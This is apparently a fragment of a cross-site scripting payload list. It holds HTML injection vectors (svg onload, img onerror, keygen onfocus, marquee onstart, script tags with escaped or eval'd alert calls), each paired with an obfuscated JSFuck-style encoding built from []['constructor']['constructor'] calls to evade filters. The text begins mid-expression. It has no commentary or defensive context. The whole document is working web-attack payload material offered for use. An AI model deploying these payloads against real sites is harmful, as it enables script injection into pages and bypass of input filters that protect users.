String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<input oncut=prompt(495)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(undefined+"")[0]+(true+"")[0]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+([false]+"")[3]+(undefined+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg onload=prompt(497)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<keygen autofocus onfocus=prompt(499)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+[0]+"")[2]+(true+"")[3]+(undefined+"")[1]+(false+[0]+"")[7]+(false+"")[1]+(undefined+"")[0]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+(undefined+"")[0]+(false+"")[3]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[3]+(undefined+"")[0]+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<video><source onerror="prompt(501)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([false]+"")[10]+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[0]+(true+"")[1]+([false]+"")[3]+(true+"")[3]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<marquee onstart=prompt(503)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(113)")()+(undefined+"")[0]+(true+"")[3]+(true+"")[3]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[3]+(true+"")[0]+(false+"")[1]+(true+"")[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg/onload=prompt(505)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg//////onload=prompt(507)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg id=x;onload=prompt(509)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+([false]+"")[10]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg id=`x`onload=prompt(511)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+([false]+"")[10]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(96)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(96)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg onload%09=prompt(513)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg %09onload=prompt(515)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg %09onload%20=prompt(517)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg onload%09%20%28%2C%3B=prompt(519)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+[])[0]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+!+[]+!+[]+!+[]+[])[0]+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<svg onload%0B=prompt(521)>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[1]+([][""]+"")[4]+[]["constructor"]["constructor"]("return String.fromCharCode(37)")()+(+[]+[])[0]+([][""]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<script>\u0061lert("523")</script>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(false+"")[2]+(true+"")[3]+(true+"")[1]+(true+"")[0]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<script>\x0061\u006C\u0065\u0072\u0074("525")</script>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<script>eval("\u0061lert(1000)")</script>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(false+"")[2]+(true+"")[3]+(true+"")[1]+(true+"")[0]+([false]+"")[11]+(+!+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<script>eval("\x0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="\u0061lert("531")""/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[0]+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(false+"")[2]+(true+"")[3]+(true+"")[1]+(true+"")[0]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="eval('\141lert("533")')"/>
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+[0]+"")[2]+(false+[0]+"")[7]+(false+"")[3]+(true+"")[1]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+(true+"")[3]+(true+"")[1]+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[2]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+(false+"")[2]+(true+"")[3]+(true+"")[1]+(true+"")[0]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<img src=x onerror="eval('\x61lert("535")')"/>
